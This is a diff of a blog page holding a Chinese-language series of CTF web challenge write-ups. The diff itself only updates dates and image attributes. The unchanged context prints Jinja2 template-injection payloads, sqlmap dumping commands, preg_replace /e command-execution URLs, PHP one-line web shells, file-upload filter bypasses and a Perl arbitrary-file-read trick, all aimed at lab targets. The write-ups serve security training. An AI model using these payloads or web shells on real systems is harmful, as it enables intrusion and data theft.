@@ -47,7 +47,7 @@
 <meta property="og:image" content="http://yoursite.com/2020/03/11/%E6%94%BB%E9%98%B2daliy/14.png">
 <meta property="og:image" content="http://yoursite.com/2020/03/11/%E6%94%BB%E9%98%B2daliy/16.png">
 <meta property="article:published_time" content="2020-03-11T10:22:54.000Z">
-<meta property="article:modified_time" content="2020-03-19T14:34:44.325Z">
+<meta property="article:modified_time" content="2020-07-14T05:13:26.639Z">
 <meta property="article:author" content="Peguin">
 <meta property="article:tag" content="train">
 <meta name="twitter:card" content="summary">
@@ -236,7 +236,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2020-03-19 22:34:44" itemprop="dateModified" datetime="2020-03-19T22:34:44+08:00">2020-03-19</time>
+                <time title="Modified: 2020-07-14 13:13:26" itemprop="dateModified" datetime="2020-07-14T13:13:26+08:00">2020-07-14</time>
               </span>
 
           
@@ -251,7 +251,7 @@
 
       
         <h4 id="0X01-FlatScience-20-03-11"><a href="#0X01-FlatScience-20-03-11" class="headerlink" title="0X01: FlatScience 20-03-11"></a>0X01: FlatScience 20-03-11<a id="more"></a></h4><p>拿到网页，正常操作scan扫一发</p>
-<img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/1.png" class="" title="examplename">
+<img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/1.png" class="">
 
 
 
@@ -280,7 +280,7 @@
 
 <p>审一下，发现’()’会被替换为空，在blacklist中的会被置为None，提交的参数在/shrine/的路径下</p>
 <p>下面来进行一下测试</p>
-<img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/2.png" class="" title="examplename">
+<img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/2.png" class="">
 
 <p>通过查阅SSTI模板引擎注入图可以知道应该是jinja2+flask</p>
 <p>由于这里的变量config被禁用，暂时没想到什么办法，看了其他师傅的wp，知道了要用python的沙箱逃逸方法，查了有关flask的内置函数，以下是资料</p>
@@ -289,14 +289,14 @@
 <p>下面用get_flashed_messages()的方法</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:&#123;&#123;get_flashed_messages.__globals__&#125;&#125;</span><br></pre></td></tr></table></figure>
 
-<img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/3.png" class="" title="examplename">
+<img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/3.png" class="">
 
 <p>可以找到current_app,继续注入当前app的config</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:&#123;&#123;get_fiashed_messages.__globals__[&#39;current_app&#39;].config&#125;&#125;</span><br></pre></td></tr></table></figure>
 
 <p>可以找到flag，这里就不贴了</p>
 <h4 id="0X03-fakebook-20-03-13"><a href="#0X03-fakebook-20-03-13" class="headerlink" title="0X03:fakebook 20-03-13"></a>0X03:fakebook 20-03-13</h4><p>拿到题目，scan冲一发</p>
-<img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/4.png" class="" title="examplename">
+<img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/4.png" class="">
 
 <p>发现有robots.txt，访问，下载源码user.php.bak</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">public</span> $age = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> $blog = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name, $age, $blog)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = (int)$age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;blog = $blog;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($url)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $ch = curl_init();</span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        $output = curl_exec($ch);</span><br><span class="line">        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">if</span>($httpCode == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close($ch);</span><br><span class="line">        <span class="keyword">return</span> $output;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> <span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get(<span class="keyword">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> <span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $blog = <span class="keyword">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> preg_match(<span class="string">"/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i"</span>, $blog);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
@@ -321,7 +321,7 @@
 <p>上工具，用sqlmap进行尝试</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u &quot;http:&#x2F;&#x2F;111.198.29.45:51961&#x2F;findpwd.php&quot; --data&#x3D;&quot;username&#x3D;a&quot; --dbs&#x2F;&#x2F;爆出了四个库，经过尝试发现所要的数据在cetc004中</span><br><span class="line">sqlmap.py -u &quot;http:&#x2F;&#x2F;111.198.29.45:51961&#x2F;findpwd.php&quot; --data&#x3D;&quot;username&#x3D;a&quot; -D cetc004 --tables&#x2F;&#x2F;爆出user表</span><br><span class="line">sqlmap.py -u &quot;http:&#x2F;&#x2F;111.198.29.45:51961&#x2F;findpwd.php&quot; --data&#x3D;&quot;username&#x3D;a&quot; -D cetc004 -T user --columns&#x2F;&#x2F;爆出四个字段，answer，question，password，username</span><br></pre></td></tr></table></figure>
 
-<img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/5.png" class="" title="examplename">
+<img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/5.png" class="">
 
 <p>可以看到已经存在的账户信息，密码被加密了，未找到解密方法，回到注册和登录页面</p>
 <p>经过测试发现注册页面相同的账户名可以注册多次，登录界面同账户不同密码都可以成功登录</p>
@@ -337,36 +337,36 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">reg_replace 函数执行一个正则表达式的搜索和替换</span><br><span class="line">mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit &#x3D; -1 [, int &amp;$count ]] )</span><br><span class="line">搜索 subject 中匹配 pattern 的部分， 以 replacement 进行替换。</span><br><span class="line">• $pattern: 要搜索的模式，可以是字符串或一个字符串数组。</span><br><span class="line">• $replacement: 用于替换的字符串或字符串数组。</span><br><span class="line">• $subject: 要搜索替换的目标字符串或字符串数组。</span><br><span class="line">• $limit: 可选，对于每个模式用于每个 subject 字符串的最大可替换次数。 默认是-1（无限制）。</span><br><span class="line">• $count: 可选，为替换执行的次数。</span><br><span class="line">这个函数有个漏洞</span><br><span class="line">当$pattern使用了&#x2F;e修正符，替换的时候会把$replacement替换进去的代码当成php代码执行，当然要构成合法的php代码才能正确执行。</span><br></pre></td></tr></table></figure>
 
 <p>思路出来了，用burp抓包</p>
-<img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/6.png" class="" title="examplename">
+<img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/6.png" class="">
 
 <p>可以看到页面成功回显了</p>
-<img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/7.png" class="" title="examplename">
+<img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/7.png" class="">
 
 <p><code>index.php?pat=/test/e&amp;&amp;rep=system(&quot;ls&quot;)&amp;&amp;sub=test</code></p>
-<img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/8.png" class="" title="examplename">
+<img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/8.png" class="">
 
 <p>下面一步需要注意，由于这里对空格进行了处理，可以用+或者%20来替代，“&amp;”用%26替代</p>
 <p><code>index.php?pat=/test/e&amp;&amp;rep=system(&quot;cd+s3chahahaDir%26%26+ls&quot;)&amp;&amp;sub=test</code></p>
-<img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/9.png" class="" title="examplename">
+<img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/9.png" class="">
 
 <p><code>index.php?pat=/test/e&amp;&amp;rep=system(&quot;cd+s3chahahaDir/flag%26%26+ls&quot;)&amp;&amp;sub=test</code></p>
 <p>找到了flag.php文件，这里就不贴图了</p>
 <p>最后用cat来读取<code>index.php?pat=/test/e&amp;&amp;rep=system(&quot;cat+s3chahahaDir/flag/flag.php&quot;)&amp;&amp;sub=test</code></p>
 <h4 id="0X06Bug-20-03-15"><a href="#0X06Bug-20-03-15" class="headerlink" title="0X06Bug  20-03-15"></a>0X06Bug  20-03-15</h4><p>打开题目场景是一个登录界面，有注册和修改密码的选项，先注册一个账号登录上去看看</p>
-<img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/10.png" class="" title="examplename">
+<img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/10.png" class="">
 
 <p>点击manage选项，无法打开，有弹窗提示：You are not admin,很明显需要管理员账号登录，但是注册时显示账号已存在，看来关键点在修改密码的页面，抓包，成功将user改成admin，再次登录，点击manage，提示Ip not Allowed,抓包，加上X-Forwarded-For:127.0.0.1,成功打开，没什么提示，查看网页源码，发现信息</p>
-<img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/11.png" class="" title="examplename">
+<img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/11.png" class="">
 
 <p>根据提示传入参数</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;111.198.29.45:39291&#x2F;index.php?module&#x3D;filemanage&amp;do&#x3D;1&#x2F;&#x2F;提示action is not correct</span><br><span class="line">尝试将do改成download，read，write，upload，最后发现时upload</span><br></pre></td></tr></table></figure>
 
-<img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/12.png" class="" title="examplename">
+<img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/12.png" class="">
 
 <p>接下来就是上传文件</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">在测试中发现有&lt;?php会报错，这就想到用php的脚本模式</span><br><span class="line">构造内容:</span><br><span class="line">&lt;script language&#x3D;&quot;php&quot;&gt;@eval($_POST[&quot;cmd&quot;])&lt;&#x2F;script&gt;以php后缀上传，burp抓包</span><br></pre></td></tr></table></figure>
 
-<img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/13.png" class="" title="examplename">
+<img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/13.png" class="">
 
 <p>根据提示尝试后缀名的绕过，在过程中发现对Content-Type有进行检测，将其改为image/jpeg，后缀名在已知的绕过方法中最后发现php4|php5可以，成功拿到flag</p>
 <h4 id="0X07ics-07-20-03-18"><a href="#0X07ics-07-20-03-18" class="headerlink" title="0X07ics-07 20-03-18"></a>0X07ics-07 20-03-18</h4><p>打开界面，发现项目管理页面有跳转，有view-source可以看源代码</p>
@@ -380,17 +380,17 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:file=../<span class="number">4.</span>php/.&amp;con=<span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_GET[<span class="string">'cmd'</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>访问uploaded/4.php</p>
-<img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/15.png" class="" title="examplename">
+<img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/15.png" class="">
 
 <p>用system来爆出路径下的文件，可以看到有flag.php,用cat来读取，在网页源码可以看到flag</p>
 <p>还有一种方法是用菜刀连接，这里就不演示了</p>
-<img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/14.png" class="" title="examplename">
+<img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/14.png" class="">
 
 <h4 id="0X08i-got-id-20-03-18"><a href="#0X08i-got-id-20-03-18" class="headerlink" title="0X08i-got-id 20-03-18"></a>0X08i-got-id 20-03-18</h4><p>打开有三个跳转链接，其中一个提示是Perl，有一个是文件上传页面，应该是Perl文件上传，去百度了以下有关的知识，猜测一下后台的逻辑</p>
 <figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> strict;</span><br><span class="line"><span class="keyword">use</span> warnings;</span><br><span class="line"><span class="keyword">use</span> CGI;</span><br><span class="line"><span class="keyword">my</span> $cgi=CGI-&gt;new;</span><br><span class="line"><span class="keyword">if</span>($cgi-&gt;upload(<span class="string">'file'</span>))&#123;</span><br><span class="line">	<span class="keyword">my</span> $file=$cgi-&gt;param(<span class="string">'file'</span>);</span><br><span class="line">		<span class="keyword">while</span> (&lt;$file&gt;)&#123;<span class="keyword">print</span> <span class="string">"$_"</span>;&#125;</span><br><span class="line">&#125;</span><br><span class="line">param()函数会返回一个列表的文件但是只有第一个文件会被放入到下面的file变量中。如果我们传入一个ARGV的文件，那么Perl会将传入的参数作为文件名读出来。对正常的上传文件进行修改,可以达到读取任意文件的目的</span><br></pre></td></tr></table></figure>
 
 <p>接下来上传一个argv文件再上传正常的文件，用bash来读取目录</p>
-<img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/16.png" class="" title="examplename">
+<img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/16.png" class="">
 
 <p>接着直接读取/flag，就可以了</p>
 
